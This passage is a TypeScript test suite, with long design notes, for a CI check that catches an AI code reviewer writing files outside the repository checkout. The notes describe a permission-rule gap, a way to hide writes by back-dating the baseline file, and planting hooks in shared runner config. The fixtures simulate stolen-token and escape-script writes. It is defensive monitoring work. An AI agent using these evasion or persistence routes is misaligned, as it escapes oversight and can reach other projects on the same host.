/**
 * ai-review-outside-reading.test.ts — something reads outside the checkout
 * (#843 finding 1).
 *
 * ## Why this is not the spelling change the issue asks for
 *
 * Finding 1 says the reviewer "can create files anywhere the runner user can
 * write", and asks for a run proving writes are refused inside and outside
 * the workspace. Two things are already settled and neither of them is in the
 * issue:
 *
 * - **The issue's stated reason is wrong.** It says `Write` "is a separate
 *   tool and is not covered" by `Edit(./**)`. Claude Code's permission
 *   documentation says the opposite in terms: *"Claude Code checks file
 *   permissions against `Edit(path)` and `Read(path)` rules only… Use
 *   `Edit(docs/**)` in place of `Write(docs/**)`."* `Edit` IS the check that
 *   governs `Write`. `AI_REVIEW_WORKSPACE_WRITE_DENY`'s docblock has carried
 *   that quote since #817.
 * - **The exposure is real anyway, for a different reason.** A rule with no
 *   leading slash anchors at the session's working directory, so `Edit(./**)`
 *   covers the checkout and nothing else. #836 measured exactly that against
 *   the real CLI: `Edit(./**)` is BLOCKED inside the checkout and **WROTE**
 *   to a path outside it.
 *
 * ## Why the fix is coupled to #824, and this file is what ships instead
 *
 * #836's table has four rows. The two that close the exposure —
 * `Edit(**)` and `Edit(<abs>/**)` — are BLOCKED in *both* columns, so each
 * of them also denies the findings write. That is why
 * `AI_REVIEW_WORKSPACE_WRITE_DENY` names respelling as its cheapest wrong
 * fix, and why `test/ai-review-untrusted-restore.test.ts` holds a case
 * against it.
 *
 * So "where may the reviewer write" is one decision, not two, and the other
 * half of it is #824. Shipping a tighter spelling here would close a HIGH
 * finding by silently closing the payload path, which is the trade the
 * module already measured and rejected.
 *
 * **What can ship without that decision is a READING.** Today the drift step
 * reads the tree and nothing reads anywhere else, so every write the grant
 * permits outside the checkout is unobserved — which is precisely the harm
 * finding 1 describes: a write that "survives into other repositories' jobs
 * on the same host". A permission is a claim and a diff is a reading; this
 * file adds the reading.
 *
 * ## It WARNS, and that is a decision with a reason
 *
 * A self-hosted runner writes under `$HOME` constantly for reasons that have
 * nothing to do with the reviewer, and the noise floor has never been
 * measured. A refusal that fires on every run is a gate consumers delete,
 * which is strictly worse than the silence it replaces. So the first version
 * names what it found and does not touch the exit code — and this
 * repository's own ai-review job is the run that measures the floor.
 *
 * `AC-4` asserts the exit code is unmoved, in both directions, so that
 * decision cannot be reversed by accident; reversing it on purpose means
 * editing a case and saying why.
 *
 * ## The time reference is the baseline file, and what that does not cover
 *
 * The reading is `find -newer <the tree baseline>`, reusing the file
 * #843 finding 2 already seals rather than adding a second artefact. Honest
 * limit, stated rather than left for a reader to discover: the seal is over
 * the baseline's CONTENT, so `touch` moves its mtime without breaking the
 * checksum. An agent that back-dates the marker hides writes from this
 * reading and is still caught by the tree comparison. That is a gap, it is
 * narrower than the gap it replaces, and it is written down.
 *
 * ## The cheapest wrong fix, named
 *
 * **Scope the `find` to a list of interesting directories** — `~/.ssh`,
 * `~/.config`, `~/.docker` — when the full `$HOME` walk turns out noisy. It
 * makes the noise go away and it is a detector narrower than what it
 * detects: the finding's own example is a `auth.json` left in gharunner's
 * home by an unrelated job, and nobody predicts the next filename. `AC-6`
 * plants a write at a path no allowlist would name and asserts it is
 * reported.
 *
 * ## What was broken to prove it
 *
 * Run and counted over this file + `test/ai-review-baseline-seal.test.ts` +
 * `test/ai-review-untrusted-restore.test.ts` (34 tests). Every count was
 * predicted before the battery ran, in `/tmp/f1b/predictions.md`, and the
 * **baseline row was read first**.
 *
 * | Row | Predicted | Measured |
 * |---|---|---|
 * | **baseline** — unmutated | 0 fail | **34 pass, 0 fail** |
 * | M1 the whole outside-reading block removed — the pre-fix state | 5 | **6 of 34** |
 * | M2 **the cheapest wrong fix**: the `find` scoped to an allowlist | 1 | **3 of 34** |
 * | M3 the `-newer` test removed | 2 | **1 of 34** |
 * | M4 the `GITHUB_WORKSPACE` exclusion removed | 1 | **1 of 34** |
 * | M5 the `RUNNER_TEMP` exclusion removed | 2 | **3 of 34** |
 * | M6 the warning turned into a refusal | 1 | **1 of 34** |
 * | M7 the no-`HOME` branch removed | 1 | **1 of 34** |
 * | M8 `-maxdepth` removed | 1 | **1 of 34** |
 *
 * **M1 at 6 against 5: the extra red is `AC-7`, and the reason is its
 * control.** `AC-7` asserts a deep file is NOT reported, which a reading
 * that reports nothing satisfies — I predicted it would pass vacuously. It
 * is red because the case also asserts a SHALLOW file IS reported in the
 * same run. That half was added on #500's rule — *what would this test
 * report if the feature were deleted* — and it is the difference between a
 * case and a sentence.
 *
 * **M2 at 3 against 1, and all three are the real kind.** Besides `AC-6`,
 * the allowlist misses `AC-4`'s `escaped.sh` and `AC-7`'s `shallow.bin`,
 * neither of which is a dotfile or under `.ssh`/`.config`. Three cases
 * catch the scoped walk, not one; mutant not broken, 31 still pass.
 *
 * **M3 at 1 against 2 — the prediction was wrong, not the check.** I
 * expected `AC-7`'s control to red as well, on the theory that dropping
 * `-newer` would surface the deep file. It does not: `-maxdepth` excludes
 * depth 6 whatever the time test says, and the two options are independent.
 * The one red is real — a `.npmrc` with a day-old mtime is reported by the
 * mutant and not by the original.
 *
 * **M5 at 3 against 2.** The extra is `AC-3`'s in-checkout case: the
 * baseline step writes `github-output` into `RUNNER_TEMP`, so removing that
 * exclusion fires the outside warning in a case that is about the tree.
 * Squarely the mutated behaviour.
 *
 * **Which cells are witnesses and which are controls.** `AC-3`'s two
 * "must NOT report" cases are controls — green on the pre-fix source by
 * construction, because a reading that reports nothing reports nothing
 * wrongly either. They exist so that a reading which fires on everything
 * cannot read as a reading that found something, and M4 and M5 are the rows
 * that make them earn it.
 *
 * None of the eight mutations is left in the tree; all were restored from a
 * `cp` backup — never `git checkout --` — and `lib/scaffold/ai-review-step.ts`
 * was confirmed byte-identical afterwards by sha256.
 *
 * ────────────────────────────────────────────────────────────────────────
 *
 * ## #866: the floor was measured, so the reading became a refusal
 *
 * Everything above was written while the posture was a warning, and `AC-4`
 * said why in its own body: the noise floor had never been measured, and a
 * refusal that fires on every run is a gate consumers delete. The job named
 * itself as the instrument that would measure it.
 *
 * It did. Two completed runs on GitHub-hosted `ubuntu-latest`, different
 * pull requests, neither touching the workflow: 12 paths and 13 paths, 25 in
 * total, and **not one of them is reviewer output**. Claude's own state,
 * npm's logs and npx cache, bun's install cache. The floor is non-empty and
 * entirely attributable to the runtime, which is the reading that lets this
 * refuse rather than the reading that stops it.
 *
 * Read with `gh api repos/<repo>/check-runs/<job-id>/annotations`. **Not by
 * grepping the run log**, which echoes the whole `run:` block and returns
 * twenty lines that look like annotations and are the step's own script
 * text — the store quoting the subject back. The same job has four real
 * annotations, two of them from Actions itself.
 *
 * ### What was broken to prove it
 *
 * 72 tests over this file plus `test/ai-review-workflow.test.ts`. Predicted
 * before the run in `/tmp/866-battery/predictions.md`; **baseline read
 * first**. Every row regenerates `.github/workflows/ai-review.yml` from the
 * mutated generator, so the "scaffold writes it verbatim" case never fires
 * and each row measures its own subject.
 *
 * | Row | Predicted | Measured | The input on which mutant and original differ |
 * |---|---|---|---|
 * | baseline | 72 pass, 0 fail | **72 pass, 0 fail** | — |
 * | U1 the pre-#866 block — warning, no exit, no exclusions | 7 | **7** | a file in `$HOME` the runtime does not own: original exits non-zero, mutant exits 0 |
 * | U2 **cheapest wrong fix** — warning restored, exclusions KEPT | 6 | **6** | the same file |
 * | U3 the exclusion list emptied | 4 | **4** | an npm debug log: original exits 0, mutant refuses |
 * | U4 `.npm` removed from the list | 4 (mis-added; see below) | **3** | the same npm log |
 * | U5 the deferred exit moved back to the reading site | 1 | **1** | a run that edits the tree AND writes to `$HOME`: original reports both and names the file, mutant exits at the outside block and never runs the comparison |
 * | U6 `.claude.json` removed | 1 | **1** | a write to `$HOME/.claude.json`, which `.claude` covers as a STRING prefix and not as a path component |
 *
 * **U3 is the row that found something, and it found it by coming back LOW
 * — 3 against a predicted 7.** The four per-entry `AC-8` cases are generated
 * from `AI_REVIEW_RUNTIME_HOME_PATHS`, so emptying the list does not redden
 * them, it DELETES them: the run was 64 pass + 3 fail, which is 67 cases and
 * not 71, and a suite that silently runs four fewer cases reports the same
 * green as one that ran them all. Not a collapsed pair and not a broken
 * mutant — **a case population that is a projection of its own subject
 * cannot witness that subject being emptied.** One case that is NOT
 * generated from the list was added, the rows that touch the list were
 * re-predicted before being re-run, and U3 is 4.
 *
 * **U4 came back 3 against a predicted 4, and that one is my arithmetic.**
 * The prediction's own reasoning names exactly three cases and the total
 * beside it says four. The three measured are the three named. Recorded
 * rather than quietly corrected, because a row that misses low is supposed
 * to be investigated and this one had nothing in it.
 *
 * **U1 and U2 differ by exactly one case, and that is the whole argument for
 * AC-10.** Both put the warning back; only U1 also drops the exclusions.
 * The six cases that red in both are about the POSTURE, and no number of
 * them can tell whether the subtraction is still there.
 *
 * **Which cells are witnesses and which are controls.** The four `AC-8`
 * per-entry cases are green under U1 and U2 by construction — they assert a
 * runtime write is exit 0, and a warning-only reading is also exit 0. They
 * are controls against a refusal that fires on everything, which is the one
 * outcome that would get this deleted, and U3 and U4 are the rows that make
 * them earn it.
 *
 * None of the six mutations is left in the tree; all were restored from a
 * `cp` backup, never `git checkout --`, and all four files were confirmed
 * byte-identical afterwards by sha256. One row ABORTED rather than measuring
 * nothing — `.claude.json` appears twice in the module, once in the array
 * and once in the docblock recording the measurement — and was re-cut
 * against a unique anchor.
 *
 * ## #871: the subtraction was too coarse, and the battery above could not
 * have seen it
 *
 * #866 subtracted four prefixes and made all four silent. Four of the twelve
 * measured paths are not inert state — `.claude.json` declares MCP servers,
 * `.claude/settings.json` declares hooks, `.claude/plugins` is the directory
 * the CLI loads from, and `.npm/_npx/<hash>/package.json` is what the next
 * `npx` resolves. On a shared self-hosted runner `$HOME` persists between
 * jobs, so a reviewer that writes a hook into `settings.json` reaches another
 * repository's build — #843 finding 1 exactly, made SILENT by the change that
 * made the surrounding reading refuse.
 *
 * Found by an automated security review of `2fa246b9`. **Every row of the U
 * battery varied the list or the posture and none asked what the entries
 * CONTAIN**, so no count above could have moved; the `AC-8` per-entry cases
 * assert a runtime write is exit 0, which is exactly what the blind spot
 * produces. A battery is only as wide as the question its rows vary.
 *
 * The fix is two lists and two passes: inert state subtracted silently,
 * trust-bearing config excluded from the REFUSAL and reported by name as
 * UNMEASURED — because the runtime rewrites those files on every run, so
 * neither their presence nor their content separates a reviewer's write from
 * the CLI's, and a reading nothing can take is not a reading that passed.
 *
 * Measured over this file alone. **Baseline read FIRST** and every count
 * predicted before the run, in `/tmp/871-battery/predictions.md`.
 *
 * | Row | Predicted | Measured | The input on which mutant and original differ |
 * |---|---|---|---|
 * | baseline | 27 pass, 0 fail | **27 pass, 0 fail, 27 cases** | — |
 * | W1 pass 2 deleted — the genuine pre-#871 behaviour | 9 | **9 of 27** | a write to `$HOME/.claude/settings.json`: original is exit 0 plus the named UNMEASURED annotation, mutant is exit 0 and SILENT |
 * | W2 **cheapest wrong fix** — the six config entries dropped from the exclusion, so the refusal fires on them | 9 | **9 of 27** | the same write: mutant refuses, which on a real runner is every pull request |
 * | W3 `AI_REVIEW_RUNTIME_CONFIG_PATHS` emptied | 5 red, 21 cases | **5 of 21** | the same write |
 * | W4 `AI_REVIEW_RUNTIME_INERT_PATHS` emptied | 5 red, 22 cases | **5 of 22** | an npm debug log: original exits 0, mutant refuses |
 * | W5 `.claude/state` MOVED from config to inert | 2 | **2 of 27** | a write to `$HOME/.claude/state/mcp-discover-verdicts.json`: original names it, mutant is silent. Both exit 0 |
 * | W6 pass 2 matches BOTH lists | 7 | **7 of 27** | an npm debug log: original silent, mutant annotated |
 * | W7 the annotation emitted without its path list | 8 | **8 of 27** | any config write: identical message, no paths |
 *
 * **W3 and W4 predicted a CASE COUNT as well as a red count, and that is the
 * whole inheritance from U3.** Both empty a list the per-entry cases are
 * generated from, so both DELETE cases rather than reddening them — 21 and 22
 * against a baseline of 27. The two non-generated exact-set cases are what
 * make those rows non-zero at all, and predicting the case count is how a
 * reader can tell a row that caught something from a row that ran less.
 *
 * **W5 is the row worth copying.** Moving one entry between the lists leaves
 * `AC-12`'s coverage case GREEN — every measured path is still in exactly one
 * list — and changes the behaviour at that path from named to silent. A
 * coverage assertion cannot see a reclassification, which is why the two
 * exact-set pins sit beside it rather than being folded into it.
 *
 * **W1 and W2 are both 9 and they are different nines.** W1's six config
 * cases red on the missing annotation; W2's red on the exit code. That is the
 * argument for `AC-13` asserting both halves in one case: either half alone
 * is satisfied by one of these two mutants.
 *
 * **One assertion of mine was red on first run and the red was correct.**
 * `AC-14` searched the whole refusal line for `settings.json`, and the
 * refusal's own prose ENUMERATES both lists to explain what it subtracted —
 * so the assertion matched the sentence rather than the finding. Fixed by
 * comparing against the absolute path, which prose cannot contain;
 * `.claude/rules/checks-must-be-able-to-fail.md`, "search the slice, not the
 * document", met from the other side and caught by the case itself.
 *
 * None of the seven mutations is left in the tree; all were restored from a
 * `cp` backup, never `git checkout --`, and `lib/scaffold/ai-review-step.ts`
 * was confirmed byte-identical by sha256 after every row.
 */

// SPEC-REF: HARNESS-STANDARD.md § Success Criteria

import { afterAll, describe, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, utimesSync, writeFileSync } from "fs";
import { tmpdir } from "os";
import { join } from "path";

import {
  AI_REVIEW_DRIFT_TITLE,
  AI_REVIEW_OUTSIDE_MAXDEPTH,
  AI_REVIEW_OUTSIDE_TITLE,
  AI_REVIEW_RUNNER_DIAGNOSTIC_PATHS,
  AI_REVIEW_FILE_SHAPED_PATHS,
  AI_REVIEW_RUNTIME_CONFIG_PATHS,
  AI_REVIEW_RUNTIME_CONFIG_UNMEASURED,
  AI_REVIEW_RUNTIME_INERT_PATHS,
  AI_REVIEW_TREE_BEFORE_SHA_VAR,
  AI_REVIEW_TREE_BEFORE_VAR,
  AI_REVIEW_UNMEASURED_TITLE,
  buildBaselineScript,
  buildDriftScript,
  runnerDiagnosticExclusion,
} from "../lib/scaffold/ai-review-step";

/**
 * The config annotation as it appears in OUTPUT.
 *
 * The exported constant carries `\$HOME` so the generated shell emits a
 * literal `$HOME` rather than expanding this process's; bash consumes that
 * backslash on the way to stdout. Derived from the export rather than typed
 * out, so the two cannot drift — a negative assertion against a drifted copy
 * of a message passes for the wrong reason, which is the entire hazard the
 * export exists to remove.
 */
const CONFIG_UNMEASURED_TEXT = AI_REVIEW_RUNTIME_CONFIG_UNMEASURED.replace("\\$", "$");

const scratch: string[] = [];
afterAll(() => {
  while (scratch.length) rmSync(scratch.pop()!, { recursive: true, force: true });
});

function scratchDir(prefix: string): string {
  const dir = mkdtempSync(join(tmpdir(), prefix));
  scratch.push(dir);
  return dir;
}

const GIT_ENV = (): Record<string, string> => ({
  PATH: process.env.PATH ?? "/usr/bin:/bin",
  GIT_AUTHOR_NAME: "t",
  GIT_AUTHOR_EMAIL: "t@example.com",
  GIT_COMMITTER_NAME: "t",
  GIT_COMMITTER_EMAIL: "t@example.com",
});

interface Run {
  code: number;
  stdout: string;
  stderr: string;
}

function sh(script: string, cwd: string, env: Record<string, string>): Run {
  const dir = scratchDir("ai-review-outside-script-");
  const path = join(dir, "step.sh");
  writeFileSync(path, script);
  const r = Bun.spawnSync(["bash", path], { cwd, env: { ...GIT_ENV(), HOME: env.HOME ?? "/tmp", ...env } });
  return {
    code: r.exitCode,
    stdout: new TextDecoder().decode(r.stdout),
    stderr: new TextDecoder().decode(r.stderr),
  };
}

/**
 * A full fixture: a committed checkout INSIDE a fake `$HOME`, which is the
 * layout a GitHub runner has — `/home/runner/work/<repo>/<repo>`. Getting
 * that wrong would make the workspace exclusion untestable, because a
 * workspace outside `$HOME` is excluded by the walk's root rather than by
 * the rule under test.
 */
function fixture() {
  const home = scratchDir("ai-review-outside-home-");
  const runnerTemp = join(home, "work", "_temp");
  const work = join(home, "work", "repo", "repo");
  mkdirSync(runnerTemp, { recursive: true });
  mkdirSync(work, { recursive: true });

  const git = (...args: string[]) => Bun.spawnSync(["git", "-C", work, ...args], { env: GIT_ENV() });
  git("init", "-q", "-b", "main");
  writeFileSync(join(work, "tracked.ts"), "export const a = 1;\n");
  git("add", "-A");
  git("commit", "-qm", "base");

  return { home, work, runnerTemp };
}

function runBaseline(f: ReturnType<typeof fixture>) {
  const out = join(f.runnerTemp, "github-output");
  writeFileSync(out, "");
  const run = sh(buildBaselineScript(), f.work, {
    HOME: f.home,
    RUNNER_TEMP: f.runnerTemp,
    GITHUB_OUTPUT: out,
  });
  const text = readFileSync(out, "utf-8");
  return {
    run,
    path: /^path=(.*)$/m.exec(text)?.[1] ?? "",
    sha: /^sha256=(.*)$/m.exec(text)?.[1] ?? "",
  };
}

function runDrift(f: ReturnType<typeof fixture>, before: string, sha: string): Run {
  return sh(buildDriftScript(), f.work, {
    AI_REVIEW_MODE: "vertex",
    HOME: f.home,
    RUNNER_TEMP: f.runnerTemp,
    GITHUB_WORKSPACE: f.work,
    [AI_REVIEW_TREE_BEFORE_VAR]: before,
    [AI_REVIEW_TREE_BEFORE_SHA_VAR]: sha,
  });
}

/** Write a file and force its mtime well before the baseline was taken. */
function writeOld(path: string, body: string): void {
  writeFileSync(path, body);
  const longAgo = new Date(Date.now() - 86_400_000);
  utimesSync(path, longAgo, longAgo);
}

// ── AC-1 / AC-2: the reading exists, and it is a reading ─────────────────

describe("AC-1 (#843/1): a write outside the checkout is reported", () => {
  test("a file the reviewer left in $HOME is named", () => {
    const f = fixture();
    const { path, sha } = runBaseline(f);
    writeFileSync(join(f.home, ".npmrc"), "//registry/:_authToken=stolen\n");
    const r = runDrift(f, path, sha);
    const text = r.stdout + r.stderr;
    expect(text, `drift output was:\n${text}`).toContain(
      `::error title=${AI_REVIEW_OUTSIDE_TITLE}`,
    );
    expect(text, "the warning does not name what it found").toContain(".npmrc");
  });

  test("AC-2, the PAIR: one thing varies — WHEN the file was written", () => {
    // Same path, same content, same tree. Only the mtime differs, so a
    // difference in what is reported is a measurement of the time reference
    // and of nothing else. A pair that also varied the filename would be
    // measuring the filename.
    const f = fixture();
    writeOld(join(f.home, ".npmrc"), "//registry/:_authToken=legitimate\n");
    const { path, sha } = runBaseline(f);
    const before = runDrift(f, path, sha);
    expect(
      before.stdout + before.stderr,
      "a file that predates the review is being blamed on the reviewer",
    ).not.toContain(`::error title=${AI_REVIEW_OUTSIDE_TITLE}`);

    writeFileSync(join(f.home, ".npmrc"), "//registry/:_authToken=stolen\n");
    const after = runDrift(f, path, sha);
    expect(after.stdout + after.stderr).toContain(`::error title=${AI_REVIEW_OUTSIDE_TITLE}`);
  });
});

// ── AC-3 / AC-4 / AC-5: what it must NOT report, and what it must not do ─

describe("AC-3 (#843/1): the reading does not double-count or misfire", () => {
  test("a write INSIDE the checkout is not reported by the outside reading", () => {
    // The tree comparison already owns that, and reporting it twice would
    // make the outside reading look like it had found something it did not.
    const f = fixture();
    const { path, sha } = runBaseline(f);
    writeFileSync(join(f.work, "evil.ts"), "export const owned = true;\n");
    const r = runDrift(f, path, sha);
    expect(r.code, "the tree comparison stopped catching an in-tree write").not.toBe(0);
    expect(
      r.stdout + r.stderr,
      "the in-tree write is reported by the outside reading as well",
    ).not.toContain(`::error title=${AI_REVIEW_OUTSIDE_TITLE}`);
  });

  test("a write inside RUNNER_TEMP is not reported", () => {
    // The payload, the tree baseline and the relocated credential all live
    // there, and the directory is this job's own scratch. Reporting it would
    // fire on every single run, which is the state that gets a gate deleted.
    const f = fixture();
    const { path, sha } = runBaseline(f);
    writeFileSync(join(f.runnerTemp, "findings.json"), '{"findings":[]}');
    const r = runDrift(f, path, sha);
    expect(r.stdout + r.stderr).not.toContain(`::error title=${AI_REVIEW_OUTSIDE_TITLE}`);
  });

  test("AC-4 (#866), the PAIR: the runtime's own write is exit 0, anything else refuses", () => {
    // This case used to assert the opposite — that the reading WARNS and the
    // exit code is unmoved in both directions — and it said why: the noise
    // floor had never been measured, so a refusal would have fired on every
    // run. #866 measured it over two runs: 25 paths, every one of them
    // runtime state, none reviewer output. So the posture moves and the case
    // moves with it, but it keeps the shape that mattered — BOTH directions,
    // varying only whether the path is one the runtime owns.
    //
    // Keeping both halves is what makes the cheapest wrong fix visible.
    // When this refusal fires on a tree nobody has investigated, the 5pm
    // repair is to put `::warning` back and drop the exit. That reds the
    // second half here while the first stays green, so the two cannot be
    // confused for each other.
    const f = fixture();
    const { path, sha } = runBaseline(f);
    const clean = runDrift(f, path, sha);
    expect(clean.code, `a clean run was refused:\n${clean.stderr}`).toBe(0);

    mkdirSync(join(f.home, ".npm", "_logs"), { recursive: true });
    writeFileSync(join(f.home, ".npm", "_logs", "2026-10-21T04_48_31_402Z-debug-0.log"), "npm\n");
    const runtime = runDrift(f, path, sha);
    expect(
      runtime.code,
      `a write the runtime makes on every run refused the review:\n${runtime.stderr}`,
    ).toBe(0);
    expect(runtime.stdout + runtime.stderr).not.toContain(`::error title=${AI_REVIEW_OUTSIDE_TITLE}`);

    writeFileSync(join(f.home, "escaped.sh"), "#!/bin/sh\necho owned\n");
    const dirty = runDrift(f, path, sha);
    expect(dirty.code, "the outside reading is still only a warning").not.toBe(0);
    expect(dirty.stderr).toContain(`::error title=${AI_REVIEW_OUTSIDE_TITLE}`);
    expect(dirty.stderr, "the refusal does not name what it found").toContain("escaped.sh");
  });
});

// ── AC-8 (#866): the measured floor, subtracted ─────────────────────────

describe("AC-8 (#866/#871): the runtime's own directories are subtracted", () => {
  test("the INERT list is the measurement, and the cases below are generated from it", () => {
    // Found by the battery, not by reading. The per-entry cases below are
    // generated from the list, so emptying the list does not RED them — it
    // DELETES them, and a suite that silently runs four fewer cases reports
    // the same green as one that ran them all. Predicted 7 red for an
    // emptied list and measured 3; the four that vanished are these.
    //
    // So the population needs one case that is not generated from the thing
    // it is about. The exact set rather than a floor, deliberately: the
    // entries ARE the measurement, and a sixth one is a claim that somebody
    // read a sixth directory in a real run. Editing this line is the
    // friction that claim should cost.
    expect([...AI_REVIEW_RUNTIME_INERT_PATHS]).toEqual([
      ".claude/.last-cleanup",
      ".claude/cache",
      ".claude/projects",
      ".npm/_logs",
      ".bun/install/cache",
    ]);
  });

  test("the CONFIG list is the measurement, and the cases below are generated from it", () => {
    // Same argument, and the friction matters more on this side: an entry
    // MOVED from here to the inert list is a claim that a write there cannot
    // reach the CLI's next start, which is the claim #871 exists because
    // nobody made. Both lists are pinned so neither can be edited quietly.
    expect([...AI_REVIEW_RUNTIME_CONFIG_PATHS]).toEqual([
      ".claude.json",
      ".claude/settings.json",
      ".claude/plugins",
      ".claude/backups",
      ".claude/state",
      ".claude/sessions",
      ".npm/_npx",
    ]);
  });

  test("AC-12 (#871): the two lists are disjoint and neither nests inside the other", () => {
    const inert = [...AI_REVIEW_RUNTIME_INERT_PATHS];
    const config = [...AI_REVIEW_RUNTIME_CONFIG_PATHS];
    expect(inert.filter(p => config.includes(p)), "a path is classified both ways").toEqual([]);

    // Nesting is the failure a set comparison cannot see. A CONFIG entry that
    // contains an INERT one makes pass 2 annotate inert state — noise in the
    // annotation nobody can act on. An INERT entry containing a CONFIG one
    // changes nothing in pass 1 (both are excluded) and nothing in pass 2
    // (which matches positively), so it is harmless today and a trap the
    // moment either pass changes shape. Both directions, named separately.
    const nested = (a: string, b: string) => b === a || b.startsWith(`${a}/`);
    expect(
      config.flatMap(c => inert.filter(i => nested(c, i)).map(i => `${c} contains ${i}`)),
      "a config prefix swallows inert state, so pass 2 annotates writes nobody needs to see",
    ).toEqual([]);
    expect(
      inert.flatMap(i => config.filter(c => nested(i, c)).map(c => `${i} contains ${c}`)),
      "an inert prefix contains a config path",
    ).toEqual([]);
  });

  test("AC-12 (#871): every path the two runs measured falls in exactly one list", () => {
    // The 25 paths of #866's measurement, reduced to the 13 distinct shapes.
    // Written out HERE rather than in the lib docblock because `ST-3` greps
    // every `.ts` for the running machine's own $HOME joined to `.claude` —
    // these are relative, which is what makes them safe to spell out.
    //
    // This is the case that makes the split checkable rather than asserted
    // in prose. Dropping an entry from either list leaves a measured path
    // matching nothing, and MOVING one between lists leaves every path
    // matched — which is why the two exact-set cases above exist beside it.
    const MEASURED = [
      ".claude.json",
      ".claude/.last-cleanup",
      ".claude/settings.json",
      ".claude/state/mcp-discover-verdicts.json",
      ".claude/cache/model-access.json",
      ".claude/projects/-a-slug/5d4ec1e2-fb26-49f0-8abb-f81860933538.jsonl",
      ".claude/backups/.claude.json.backup.1792558105498",
      ".claude/plugins/plugin-directory-cache-v2.json",
      // #907's two shapes, from runs `39620098295` and `39620105739`.
      ".claude/sessions/1214993.json",
      ".claude/sessions/1187153." +
        "0f3a1c7e5b9d2486af01c3e7d59b8426ff7a0d13c6e58b92a4017de3cb56f8a2.key",
      ".npm/_npx/9d1f0c2e4b7a8365/package.json",
      ".npm/_npx/9d1f0c2e4b7a8365/package-lock.json",
      ".npm/_logs/2026-10-21T04_48_31_402Z-debug-0.log",
      ".npm/_logs/2026-10-21T04_48_39_043Z-debug-0.log",
      ".bun/install/cache/c17f4447ebe3362d.npm",
    ];
    const under = (prefix: string, p: string) => p === prefix || p.startsWith(`${prefix}/`);
    const unclassified: string[] = [];
    const both: string[] = [];
    for (const p of MEASURED) {
      const i = AI_REVIEW_RUNTIME_INERT_PATHS.some(e => under(e, p));
      const c = AI_REVIEW_RUNTIME_CONFIG_PATHS.some(e => under(e, p));
      if (!i && !c) unclassified.push(p);
      if (i && c) both.push(p);
    }
    expect(unclassified, "a measured path is in neither list, so the refusal fires on every run").toEqual([]);
    expect(both, "a measured path is in both lists").toEqual([]);
  });

  // One case per declared entry, generated from the list rather than written
  // out, so removing an entry removes exactly one case — see the cases above
  // for why that is not the same as reddening one.
  for (const entry of AI_REVIEW_RUNTIME_INERT_PATHS) {
    test(`AC-8: a write under ${entry} is exit 0 and SILENT`, () => {
      const f = fixture();
      const { path, sha } = runBaseline(f);
      const target = join(f.home, entry);
      mkdirSync(join(target, ".."), { recursive: true });
      writeFileSync(target, "runtime state\n");
      const r = runDrift(f, path, sha);
      const text = r.stdout + r.stderr;
      expect(r.code, `${entry} is inert runtime state and refused:\n${r.stderr}`).toBe(0);
      expect(text).not.toContain(`::error title=${AI_REVIEW_OUTSIDE_TITLE}`);
      // Silent is the claim. Exit 0 alone is satisfied by a path that is
      // annotated as runtime config, which is a different reading.
      expect(text, `${entry} is inert state and was reported as runtime config`).not.toContain(
        CONFIG_UNMEASURED_TEXT,
      );
    });
  }

  for (const entry of AI_REVIEW_RUNTIME_CONFIG_PATHS) {
    test(`AC-13 (#871): a write under ${entry} is exit 0 AND named UNMEASURED`, () => {
      // Both halves in ONE case, deliberately. The exit alone is satisfied by
      // #866's silent exclusion — the defect this issue exists for. The
      // annotation alone is satisfied by a refusal, which is #871's own
      // cheapest wrong fix and goes red on every pull request. Only the
      // conjunction is the behaviour.
      const f = fixture();
      const { path, sha } = runBaseline(f);
      const target = join(f.home, entry);
      mkdirSync(join(target, ".."), { recursive: true });
      writeFileSync(target, "hooks: []\n");
      const r = runDrift(f, path, sha);
      const text = r.stdout + r.stderr;
      expect(r.code, `${entry} is written by the runtime every run and refused:\n${r.stderr}`).toBe(0);
      expect(text).not.toContain(`::error title=${AI_REVIEW_OUTSIDE_TITLE}`);
      expect(text, `${entry} was subtracted in silence — #866's blind spot`).toContain(
        `::warning title=${AI_REVIEW_UNMEASURED_TITLE}::${CONFIG_UNMEASURED_TEXT}`,
      );
      // The absolute path, not the entry name: the refusal's prose enumerates
      // both lists, so a relative spelling is satisfied by a sentence.
      expect(text, "the annotation does not name the path it found").toContain(target);
    });
  }

  test("AC-14 (#871): a config write beside an unlisted one refuses, and both are named", () => {
    // The config reading must not swallow the refusal. It is a warning and
    // the refusal is an error, so nothing in the ordering should let one
    // suppress the other — which is a behaviour, so it is a case.
    const f = fixture();
    const { path, sha } = runBaseline(f);
    mkdirSync(join(f.home, ".claude"), { recursive: true });
    writeFileSync(join(f.home, ".claude", "settings.json"), '{"hooks":{}}');
    writeFileSync(join(f.home, "escaped.sh"), "#!/bin/sh\necho owned\n");
    const r = runDrift(f, path, sha);
    const text = r.stdout + r.stderr;
    expect(r.code, "the config annotation swallowed the refusal").not.toBe(0);
    expect(r.stderr).toContain(`::error title=${AI_REVIEW_OUTSIDE_TITLE}`);
    expect(r.stderr, "the refusal does not name the unlisted write").toContain("escaped.sh");
    expect(text, "the refusal suppressed the config reading").toContain(
      CONFIG_UNMEASURED_TEXT,
    );
    expect(text, "the config annotation does not name the config path").toContain(
      join(f.home, ".claude", "settings.json"),
    );
    // And the refusal is about the unlisted path only — a config path in the
    // refusal would mean pass 1 stopped excluding it.
    //
    // Compared against the ABSOLUTE path, because the refusal's own prose
    // enumerates both lists to explain what it subtracted, so a search for
    // `settings.json` over the message matches the sentence rather than the
    // finding. The first draft of this assertion did exactly that and this
    // case went red for it — `.claude/rules/checks-must-be-able-to-fail.md`,
    // "search the slice, not the document", met from the other side.
    const refusal = r.stderr.slice(r.stderr.indexOf(`::error title=${AI_REVIEW_OUTSIDE_TITLE}`));
    const line = refusal.slice(0, refusal.indexOf("\n"));
    expect(line, "a config path reached the REFUSAL").not.toContain(
      join(f.home, ".claude", "settings.json"),
    );
    expect(line, "the refusal is not reporting the unlisted write by its real path").toContain(
      join(f.home, "escaped.sh"),
    );
  });

  // ── #877: the CI runner's own diagnostics are not the reviewer ──────────
  //
  // The floor #866 measured and #871 split was measured on GitHub-HOSTED
  // runners, where `$HOME` is fresh per job and exactly one runner process
  // exists. Every fixture met that precondition, so the branch where it is
  // false was outside the measurement entirely — the shape
  // `.claude/rules/checks-must-be-able-to-fail.md` records against #492.
  //
  // On asaCommandCenter's self-hosted pool ten runner processes share one
  // home directory and each writes its own `_diag` logs continuously, by
  // design. Run `39564143967` refused with 30 paths, every one matching
